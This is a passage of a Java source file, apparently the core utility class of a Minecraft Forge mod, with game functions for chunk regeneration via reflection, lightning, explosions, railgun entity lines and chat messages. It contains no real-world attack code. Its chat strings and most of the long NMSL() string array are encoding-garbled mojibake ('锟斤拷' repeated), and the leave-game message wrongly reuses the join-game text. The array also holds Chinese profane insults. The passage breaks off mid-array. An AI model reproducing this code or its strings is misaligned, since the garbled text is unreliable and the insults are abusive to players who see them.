package xuanwu.ultimate.core;

import com.google.common.base.Preconditions;
import com.ibm.icu.impl.InvalidFormatException;
import com.mojang.authlib.GameProfile;
import cpw.mods.fml.common.Loader;
import cpw.mods.fml.common.eventhandler.EventBus;
import cpw.mods.fml.common.network.simpleimpl.SimpleNetworkWrapper;
import cpw.mods.fml.relauncher.ReflectionHelper;
import io.netty.util.concurrent.GenericFutureListener;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.security.MessageDigest;
import java.util.ArrayList;
import java.util.Collection;
import java.util.Collections;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.NoSuchElementException;
import java.util.Random;
import java.util.Set;
import java.util.TimerTask;

import javax.annotation.Nullable;

import net.minecraft.block.Block;
import net.minecraft.block.BlockOre;
import net.minecraft.block.material.Material;
import net.minecraft.enchantment.Enchantment;
import net.minecraft.enchantment.EnchantmentHelper;
import net.minecraft.entity.DataWatcher;
import net.minecraft.entity.Entity;
import net.minecraft.entity.EntityLivingBase;
import net.minecraft.entity.SharedMonsterAttributes;
import net.minecraft.entity.ai.attributes.IAttributeInstance;
import net.minecraft.entity.item.EntityItem;
import net.minecraft.entity.item.EntityTNTPrimed;
import net.minecraft.entity.passive.EntityTameable;
import net.minecraft.entity.player.EntityPlayer;
import net.minecraft.entity.player.EntityPlayerMP;
import net.minecraft.entity.player.InventoryPlayer;
import net.minecraft.entity.projectile.EntityWitherSkull;
import net.minecraft.init.Blocks;
import net.minecraft.item.ItemStack;
import net.minecraft.network.NetHandlerPlayServer;
import net.minecraft.network.play.server.S40PacketDisconnect;
import net.minecraft.potion.Potion;
import net.minecraft.potion.PotionEffect;
import net.minecraft.server.MinecraftServer;
import net.minecraft.server.management.PlayerProfileCache;
import net.minecraft.server.management.ServerConfigurationManager;
import net.minecraft.util.AxisAlignedBB;
import net.minecraft.util.ChatComponentText;
import net.minecraft.util.ChatComponentTranslation;
import net.minecraft.util.DamageSource;
import net.minecraft.util.EnumChatFormatting;
import net.minecraft.util.LongHashMap;
import net.minecraft.util.MathHelper;
import net.minecraft.util.Vec3;
import net.minecraft.world.ChunkCoordIntPair;
import net.minecraft.world.Explosion;
import net.minecraft.world.World;
import net.minecraft.world.WorldProvider;
import net.minecraft.world.WorldServer;
import net.minecraft.world.chunk.Chunk;
import net.minecraft.world.chunk.IChunkProvider;
import net.minecraft.world.gen.ChunkProviderServer;
import net.minecraftforge.common.DimensionManager;
import net.minecraftforge.common.ForgeHooks;
import net.minecraftforge.common.MinecraftForge;
import net.minecraftforge.common.config.Configuration;
import net.minecraftforge.event.entity.living.LivingDeathEvent;
import net.minecraftforge.event.entity.living.LivingHurtEvent;
import org.apache.logging.log4j.Logger;
import xuanwu.ultimate.UltimateMod;
import xuanwu.ultimate.core.Data.StoredData;
import xuanwu.ultimate.core.Data.UltimateOnwerList;
import xuanwu.ultimate.core.util.EventUtil;
import xuanwu.ultimate.entity.EntityFont;
import xuanwu.ultimate.entity.TESTENTITY;
import xuanwu.ultimate.entity.ultimateLightningbolt;
import xuanwu.ultimate.item.ultimateSword;
import xuanwu.ultimate.listeners.UltimateTimer;
import xuanwu.ultimate.net.Packets.PacketNoDeadGui;
import xuanwu.ultimate.register.Register;
import xuanwu.ultimate.world.WorldProviderPollute;
import xuanwu.ultimate.world.WorldTeleporterPollute;

public class ultimateCore
{
	  public static boolean regen(World world,int x,int z){
		  try {
		  IChunkProvider provider = world.getChunkProvider();
	        if (!(provider instanceof ChunkProviderServer)) {
	          return false;
	        }
	        ChunkProviderServer chunkServer = (ChunkProviderServer)provider;
	        Field u = null, m = null, lc = null, p = null;
	        try {
	            u = ChunkProviderServer.class.getDeclaredField("field_73248_b");
	          } catch (NoSuchFieldException e) {
	            try {
					u = ChunkProviderServer.class.getDeclaredField("chunksToUnload");
				} catch (NoSuchFieldException e1) {
					e1.printStackTrace();
				} catch (SecurityException e1) {
					e1.printStackTrace();
				}
	          } 
	          u.setAccessible(true);
				Set<?> unloadQueue = (Set)u.get(chunkServer);
	          try {
	            m = ChunkProviderServer.class.getDeclaredField("field_73244_f");
	          } catch (NoSuchFieldException e) {
	            try {
					m = ChunkProviderServer.class.getDeclaredField("loadedChunkHashMap");
				} catch (NoSuchFieldException e1) {
					e1.printStackTrace();
				} catch (SecurityException e1) {
					e1.printStackTrace();
				}
	          } 
	          m.setAccessible(true);
				LongHashMap loadedMap = (LongHashMap)m.get(chunkServer);
	          try {
	            lc = ChunkProviderServer.class.getDeclaredField("field_73245_g");
	          } catch (NoSuchFieldException e) {
	            try {
					lc = ChunkProviderServer.class.getDeclaredField("loadedChunks");
				} catch (NoSuchFieldException e1) {
					e1.printStackTrace();
				} catch (SecurityException e1) {
					e1.printStackTrace();
				}
	          } 
	          lc.setAccessible(true);
				List<Chunk> loaded = (List<Chunk>)lc.get(chunkServer);
	          try {
	            p = ChunkProviderServer.class.getDeclaredField("field_73246_d");
	          } catch (NoSuchFieldException e) {
	            try {
					p = ChunkProviderServer.class.getDeclaredField("currentChunkProvider");
				} catch (NoSuchFieldException e1) {
					e1.printStackTrace();
				} catch (SecurityException e1) {
					e1.printStackTrace();
				}
	          } 
	          p.setAccessible(true);
				IChunkProvider chunkProvider = (IChunkProvider)p.get(chunkServer);
				long pos = ChunkCoordIntPair.chunkXZ2Int(x,z);
		          if (chunkServer.chunkExists(x,z)) {
		              Chunk chunk1 = chunkServer.loadChunk(x,z);
		              chunk1.onChunkUnload();
		            } 
		          unloadQueue.remove(Long.valueOf(pos));
		          loadedMap.remove(pos);
		          Chunk mcChunk = chunkProvider.provideChunk(x,z);
		          loadedMap.add(pos, mcChunk);
		          loaded.add(mcChunk);
		          if (mcChunk != null) {
		            mcChunk.onChunkLoad();
		            mcChunk.populateChunk(chunkProvider, chunkProvider,x,z);
		          } 
		  }catch(Throwable exp) {
			  return false;
		  }
return true;
		  }
  public static double Infinity = Double.POSITIVE_INFINITY;
  public static float FInfinity = Float.POSITIVE_INFINITY;
  
  public static void Lightningbolt(World world, double x, double y, double z)
  {
    ultimateLightningbolt lightningbolt = new ultimateLightningbolt(world, x, y, z);
    lightningbolt.worldObj.spawnEntityInWorld(lightningbolt);
  }
  public static void SendEntityJoinGameMessage(String name) {
	  ultimateCore.ChatPrint(EnumChatFormatting.YELLOW+name+" 鍔犲叆浜嗘父鎴�");
  }
  public static void Say(String name,String message) {
	  ultimateCore.ChatPrint(" <"+name+"> "+message);
  }
  public static void SendEntityLeaveGameMessage(String name) {
	  ultimateCore.ChatPrint(EnumChatFormatting.YELLOW+name+" 鍔犲叆浜嗘父鎴�");
  }
  public static void GHRZERO(Entity entity) {
	  entity.getEntityData().setBoolean("GHRZERO",true);
  }
  public static void LightningboltOnEntity(Entity entity)
  {
    World world = entity.worldObj;
    double x = entity.posX;
    double y = entity.posY;
    double z = entity.posZ;
    Lightningbolt(world, x, y, z);
  }
  
  private static int exploderange = 10;
  public static void RailGunShoot(Entity player) {
final Vec3 lookVec = player.getLookVec();
final double x = player.posX;
final double y = player.posY;
final double z = player.posZ;
      for(double i = 0;i < 512;i+=0.5){
    	  try {
          double x1 = x + lookVec.xCoord * i;
          double y1 = y + lookVec.yCoord * i;
          double z1 = z + lookVec.zCoord * i;
          TESTENTITY entity = new TESTENTITY(player.worldObj);
          entity.setPosition(x1,y1,z1);
          entity.setThrower(player);
          entity.worldObj.spawnEntityInWorld(entity);
    	  }catch(Throwable exp) {
    		  exp.printStackTrace();
    	  }
      }
  }
  public static void RailGunShoot(EntityPlayer player) {
final Vec3 lookVec = player.getLookVec();
final double x = player.posX;
final double y = player.posY;
final double z = player.posZ;
      for(double i = 0;i < 512;i+=0.5){
    	  try {
          double x1 = x + lookVec.xCoord * i;
          double y1 = y + lookVec.yCoord * i;
          double z1 = z + lookVec.zCoord * i;
          TESTENTITY entity = new TESTENTITY(player.worldObj);
          entity.setPosition(x1,y1,z1);
          entity.setThrower(player);
          entity.worldObj.spawnEntityInWorld(entity);
    	  }catch(Throwable exp) {
    		  exp.printStackTrace();
    	  }
      }
  }
  public static void RailGunShoot(World world,double x,double y,double z,double x1,double y1,double z1) {
	  List<EntityPosition> positions = ultimateCore.line(x,y,z,x1,y1,z1,0.5);
	  for(EntityPosition position : positions) {
		  TESTENTITY entity = new TESTENTITY(world);
		  entity.setPosition(position.x,position.y,position.z);
		  entity.worldObj.spawnEntityInWorld(entity);
	  }
  }
  public static void ReloadWorld(World world) {
	  DimensionManager.unloadWorld(world.provider.dimensionId);
	  
  }
  public static void RailGunShoot(World world,double x,double y,double z,double x1,double y1,double z1,Entity thrower) {
	  List<EntityPosition> positions = ultimateCore.line(x,y,z,x1,y1,z1,0.5);
	  for(EntityPosition position : positions) {
		  TESTENTITY entity = new TESTENTITY(world);
		  entity.setPosition(position.x,position.y,position.z);
		  entity.setThrower(entity);
		  entity.worldObj.spawnEntityInWorld(entity);
	  }
  }
  public static void RailGunShoot(Entity source,Entity target) {
	  if(source.worldObj == target.worldObj) {
	  RailGunShoot(source.worldObj,source.posX,source.posY,source.posZ,target.posX,target.posY,target.posZ);
	  }
  }
  public static void RailGunShoot(Entity source,Entity target,Entity thrower) {
	  if(source.worldObj == target.worldObj) {
	  RailGunShoot(source.worldObj,source.posX,source.posY+source.getEyeHeight(),source.posZ,target.posX,target.posY,target.posZ,thrower);
	  }
  }
  public static void LightningboltAndExplodeOnEntity(Entity entity)
  {
    LightningboltOnEntity(entity);
    entity.worldObj.createExplosion(null, entity.posX, entity.posY, entity.posZ, exploderange, false).doExplosionB(true);
  }
  
  public static double randomvel()
  {
    return (new Random().nextDouble() - 0.5D) * 0.08D;
  }
  
  public static void ExplodeOnEntity(Entity entity)
  {
    entity.worldObj.createExplosion(null, entity.posX, entity.posY, entity.posZ, exploderange, false).doExplosionB(true);
  }
  
  public static void TX(Entity entity)
  {
    double x = entity.posX;
    double y = entity.posY;
    double z = entity.posZ;
    for (int i = 0; i < 2560; i++)
    {
      int s = 10000;
      entity.worldObj.spawnParticle(Particle.crit, x, y + randomvel() * s, z, randomvel(), randomvel(), randomvel());
      entity.worldObj.spawnParticle(Particle.magicCrit, x, y + randomvel() * s, z, randomvel(), randomvel(), randomvel());
      entity.worldObj.spawnParticle(Particle.portal, x, y + randomvel() * s, z, randomvel(), randomvel(), randomvel());
      entity.worldObj.spawnParticle(Particle.witchMagic, x, y + randomvel() * s, z, randomvel(), randomvel(), randomvel());
    }
  }
  
  public static void RenderFontOnPlayer(EntityPlayer player, String font)
  {
    EntityFont ef = new EntityFont(player.worldObj, font, player.posX, player.posY + 2.0D, player.posZ);
    ef.font = font;
    ef.worldObj.spawnEntityInWorld(ef);
  }
  
  public static void RenderFontOnEntity(Entity player, String font)
  {
    EntityFont ef = new EntityFont(player.worldObj, font, player.posX, player.posY + player.getEyeHeight(), player.posZ);
    ef.font = font;
    ef.worldObj.spawnEntityInWorld(ef);
  }
  
  public static String NMSL()
  {
    String[] bb = { "锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷", "锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷", "CNM", "WDNMD", "锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷", "锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷", "锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷", "锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷", "锟斤拷锟斤拷", "锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷", "锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷", "锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷", "锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷 锟斤拷锟斤拷锟斤拷锟斤拷b锟斤拷锟斤拷锟斤拷锟斤拷 锟斤拷锟斤拷", "锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷", "锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷", "锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷", "锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷", "锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷", "锟斤拷?锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷 锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷", "锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷", "锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷", "锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷", "锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷", "锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷,锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷,锟斤拷锟斤拷锟斤拷,锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷", "锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷", "锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷 锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷 锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷", "锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷 锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷", "锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷", "锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷", "锟斤拷锟斤拷锟斤拷?锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷", "锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷dj锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷", "锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷~~~", "锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷 锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷 锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷 锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷", "锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷", "锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷?", "锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷101p", "锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷?锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷 锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷 锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷?锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷?锟斤拷锟斤拷锟斤拷", "锟斤拷?锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷?锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷ziwei锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷piyan锟斤拷?锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷??", "锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷", "锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷3锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷", "锟斤拷锟斤拷锟斤拷锟斤拷 锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷 锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷 锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷 锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷 锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷 锟斤拷锟斤拷锟斤拷锟斤拷 锟斤拷锟斤拷锟斤拷锟斤拷 锟斤拷锟斤拷锟斤拷锟斤拷 ?", "锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷", "锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷 锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷 锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷 锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷 锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷 锟斤拷锟斤拷锟斤拷~~~~~~", "锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷", "锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷", "锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷 ", "锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷 锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷", 